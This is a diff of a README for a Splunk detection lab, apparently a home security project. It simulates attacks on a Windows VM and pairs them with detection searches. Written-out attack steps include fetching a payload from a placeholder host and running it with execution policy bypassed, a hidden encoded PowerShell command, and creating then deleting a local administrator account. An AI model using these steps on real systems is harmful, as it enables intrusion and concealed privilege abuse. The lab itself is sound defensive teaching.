@@ -46,7 +46,7 @@ This lab project demonstrates how to use Splunk to monitor and detect advanced t
 │  │  • WinEventLog       │          │  • Splunk Enterprise│  │
 │  │  • Event IDs: 4720,  │  TCP/9997│  • Forwarder Listen│  │
 │  │    4732, 4726, etc.  │  network │  • Python HTTP Srv │  │
-│  │  • Universal         ├──────────┤  • Port 8000 (Web) │  │
+│  │  • Universal         ├──────────┤  • Port 8080 (Web) │  │
 │  │    Forwarder Enabled │          │  • Port 9997 (Data)│  │
 │  │                      │          │                    │  │
 │  └──────────────────────┘          └────────────────────┘  │
@@ -64,6 +64,8 @@ Data flow:
 3. Events traverse the libvirt network bridge to Linux host
 4. Splunk Enterprise indexes and correlates events in real time
 5. Dashboards and searches provide visibility and alerting
+
+![Network Pipeline Validation](images/Test_NetConncetion.png)
 
 ---
 
@@ -125,41 +127,44 @@ sslVerifyServerCert = false
 
 ### 1. Ingress Tool Transfer (MITRE ATT&CK T1105)
 
-Objective: Simulate the delivery of a malicious PowerShell payload from an external Linux host to bypass network isolation controls.
+Objective: Simulate the delivery of an encoded PowerShell payload from an external Linux host to bypass network isolation controls.
 
 Attack flow:
 
-1. Python HTTP server on the Linux host serves an encoded PowerShell payload (`command-payload.txt`)
+1. Python HTTP server on the Linux host serves an encoded PowerShell command (`command-payload.txt`)
 2. The Windows endpoint retrieves the payload over HTTP
-3. The payload executes locally to simulate malicious tooling being delivered to the endpoint in a lab environment
+3. The encoded command executes locally to simulate malicious tooling being delivered to the endpoint in a lab environment
 
 Example setup on the Linux host:
 
 ```bash
-# Create encoded PowerShell payload
-printf '%s' 'Write-Host "Privilege Escalation Payload"' > command-payload.txt
+# Stage the encoded PowerShell command
+echo "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAUwBwAGwAdQBuAGsAIQAiAA==" > command-payload.txt
 
 # Start temporary HTTP server
-python3 -m http.server 8888
+python3 -m http.server 8080
 ```
 
-Example retrieval on the Windows endpoint:
+![Payload Staging & Retrieval](images/command_extraction.png)
+
+Example execution on the Windows endpoint:
 
 ```powershell
-# Download payload from Linux host
-powershell -Command "Invoke-WebRequest -Uri 'http://<linux-ip>:8888/command-payload.txt' -OutFile 'C:\Temp\payload.ps1'"
-
-# Execute payload
-powershell -ExecutionPolicy Bypass -File C:\Temp\payload.ps1
+# Execute the retrieved encoded command
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAUwBwAGwAdQBuAGsAIQAiAA==
 ```
+
+![Endpoint Execution](images/Win11VM_PowershellCommands.png)
 
 Splunk detection example:
 
 ```spl
-sourcetype=WinEventLog:Security EventID=5156
-| search dest_port=8888 dest_ip="<linux-ip>"
+sourcetype=WinEventLog:Security EventCode=5156
+| search dest_port=8080 dest_ip="<linux-ip>"
 | stats count by user, dest_ip, dest_port, action
 ```
+
+![Splunk Process Creation Detection](images/WinEvenLog_Splunk.png)
 
 This technique demonstrates how an attacker can use a temporary Python HTTP server to serve an encoded payload and bypass clipboard/network isolation controls in a lab scenario.
 
@@ -179,7 +184,7 @@ PowerShell commands:
 
 ```powershell
 # Create the fake service account
-net user Service_Backup P@ssw0rd123 /add
+net user Service_Backup P@ssw0rd123! /add
 
 # Add it to the local Administrators group
 net localgroup Administrators Service_Backup /add
@@ -188,22 +193,28 @@ net localgroup Administrators Service_Backup /add
 net user Service_Backup /delete
 ```
 
+![Terminal Execution](images/powershell_commands.png)
+
 The account is effectively invisible on the Windows endpoint after deletion (`net user` shows nothing), but Splunk can still correlate the events:
 
 - Event ID 4720: A user account was created
 - Event ID 4732: A user was added to a security-enabled local group
 - Event ID 4726: A user account was deleted
 
+![Live Endpoint Clean State](images/No_Service_Backup_user_detected.png)
+
 Splunk correlation example:
 
 ```spl
-sourcetype=WinEventLog:Security (EventID=4720 OR EventID=4732 OR EventID=4726)
-| transaction user_account startswith=(EventID=4720) endswith=(EventID=4726) maxspan=5m
-| search EventID=4732
-| table user_account, EventID, timestamp, ComputerName
+sourcetype=WinEventLog:Security (EventCode=4720 OR EventCode=4732 OR EventCode=4726)
+| transaction user_account startswith=(EventCode=4720) endswith=(EventCode=4726) maxspan=5m
+| search EventCode=4732
+| table user_account, EventCode, timestamp, ComputerName
 | stats count by user_account
 | where count >= 3
 ```
+
+![Splunk Phantom Account Correlation](images/Rapid_execution.png)
 
 This demonstrates a phantom privilege escalation sequence: temporary local administrator creation, permission assignment, and rapid cleanup that is visible in Splunk but not on the endpoint after the account is deleted.
 
@@ -224,8 +235,8 @@ Panels:
 Search:
 
 ```spl
-sourcetype=WinEventLog:Security (EventID=4720 OR EventID=4732 OR EventID=4726)
-| timechart count by EventID
+sourcetype=WinEventLog:Security (EventCode=4720 OR EventCode=4732 OR EventCode=4726)
+| timechart count by EventCode
 ```
 
 ### Dashboard 2: Process Execution & Lateral Movement
@@ -241,8 +252,8 @@ Panels:
 Search:
 
 ```spl
-sourcetype=WinEventLog:Security EventID=5156 action=allow
-| search dest_port=8888 OR dest_port=8080 OR dest_port=3389
+sourcetype=WinEventLog:Security EventCode=5156 action=allow
+| search dest_port=8080 OR dest_port=3389
 | stats count, values(dest_ip), values(dest_port) by user
 ```
 
@@ -263,7 +274,7 @@ Panels:
 ### Example 1: Find all failed login attempts in the last 24 hours
 
 ```spl
-sourcetype=WinEventLog:Security EventID=4625
+sourcetype=WinEventLog:Security EventCode=4625
 | stats count as failed_attempts by user, dest_ip
 | sort - failed_attempts
 | head 20
@@ -272,16 +283,16 @@ sourcetype=WinEventLog:Security EventID=4625
 ### Example 2: Detect rapid account creation and deletion
 
 ```spl
-sourcetype=WinEventLog:Security (EventID=4720 OR EventID=4726)
-| transaction user_account startswith=(EventID=4720) endswith=(EventID=4726) maxspan=10m
-| search EventID=4720 AND EventID=4726
+sourcetype=WinEventLog:Security (EventCode=4720 OR EventCode=4726)
+| transaction user_account startswith=(EventCode=4720) endswith=(EventCode=4726) maxspan=10m
+| search EventCode=4720 AND EventCode=4726
 | table user_account, ComputerName, timestamp
 ```
 
 ### Example 3: Track Administrators group membership changes
 
 ```spl
-sourcetype=WinEventLog:Security EventID=4732 group="Administrators"
+sourcetype=WinEventLog:Security EventCode=4732 group="Administrators"
 | table timestamp, user_account, action, ComputerName
 | stats count by user_account, action
 ```
@@ -289,7 +300,7 @@ sourcetype=WinEventLog:Security EventID=4732 group="Administrators"
 ### Example 4: Monitor PowerShell execution attempts
 
 ```spl
-sourcetype=WinEventLog:Security EventID=4688 process_name=powershell.exe
+sourcetype=WinEventLog:Security EventCode=4688 process_name=powershell.exe
 | stats count as execution_count by user, process_name, ComputerName
 | where execution_count > 5
 ```
@@ -298,9 +309,9 @@ sourcetype=WinEventLog:Security EventID=4688 process_name=powershell.exe
 
 ```spl
 sourcetype=WinEventLog:Security
-| search (EventID=5156 AND dest_port=8888) OR (EventID=4720) OR (EventID=4732 AND group="Administrators")
-| stats count by EventID, user
-| timechart count by EventID
+| search (EventCode=5156 AND dest_port=8080) OR (EventCode=4720) OR (EventCode=4732 AND group="Administrators")
+| stats count by EventCode, user
+| timechart count by EventCode
 ```
 
 ---
@@ -320,7 +331,18 @@ sourcetype=WinEventLog:Security
 2. Run the installer
 3. Complete the installation path
 
-### Step 2: Configure inputs.conf
+### Step 2: Enable Process Tracking & Command-Line Auditing
+
+Event ID 4688 and command-line logging are **disabled by default** on Windows 11 and must be explicitly enabled before any process-execution telemetry will appear in Splunk.
+
+1. Open `gpedit.msc`
+2. Navigate to `Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Detailed Tracking`
+3. Set **Audit process tracking** to **Success**
+4. Navigate to `Computer Configuration > Administrative Templates > System > Audit Process Creation`
+5. Set **Include command line in process creation events** to **Enabled**
+6. Run `gpupdate /force` to apply the policy
+
+### Step 3: Configure inputs.conf
 
 Use UTF-8 encoding without BOM when editing configuration files. Avoid Notepad because it can inject a hidden UTF-8 BOM.
 
@@ -336,7 +358,7 @@ sourcetype = WinEventLog:System
 disabled = false
 ```
 
-### Step 3: Configure outputs.conf
+### Step 4: Configure outputs.conf
 
 ```ini
 [tcpout]
@@ -346,13 +368,13 @@ defaultGroup = splunk_indexer
 server = <linux-host-ip>:9997
 ```
 
-### Step 4: Restart Splunk Forwarder
+### Step 5: Restart Splunk Forwarder
 
 ```powershell
 Restart-Service SplunkForwarder
 ```
 
-### Step 5: Verify on Splunk Enterprise
+### Step 6: Verify on Splunk Enterprise
 
 1. Log in to Splunk Web
 2. Search for Windows event data
@@ -378,16 +400,17 @@ Restart-Service SplunkForwarder
 
 #### Network Bridging
 
-The lab initially failed because the Linux libvirt firewall zone was dropping traffic from the Windows VM. The fix was to manually allow TCP/9997 traffic so the forwarder could send events to Splunk.
+The lab initially failed because the Linux libvirt firewall zone was dropping traffic from the Windows VM. The fix was to manually allow TCP/9997 (Splunk forwarding) and TCP/8080 (Python HTTP payload server) traffic so the forwarder and the tool-transfer scenario could reach the Linux host.
 
 Example firewall allow rule:
 
 ```bash
 sudo firewall-cmd --zone=libvirt --add-port=9997/tcp --permanent
+sudo firewall-cmd --zone=libvirt --add-port=8080/tcp --permanent
 sudo firewall-cmd --reload
 ```
 
-This resolved the connectivity issue and allowed WinEventLog data to reach the Splunk indexer.
+This resolved the connectivity issue and allowed WinEventLog data and payload traffic to reach the Splunk indexer and HTTP server respectively.
 
 #### Configuration Encoding
 
@@ -399,7 +422,7 @@ Diagnostic command:
 C:\Program Files\SplunkUniversalForwarder\bin\splunk show config inputs
 ```
 
-The fix was to recreate the config file with strict UTF-8 encoding and no BOM. This restored the forwarder’s ability to ingest Windows event logs properly.
+The fix was to recreate the config file with strict UTF-8 encoding and no BOM. This restored the forwarder's ability to ingest Windows event logs properly.
 
 ---
 
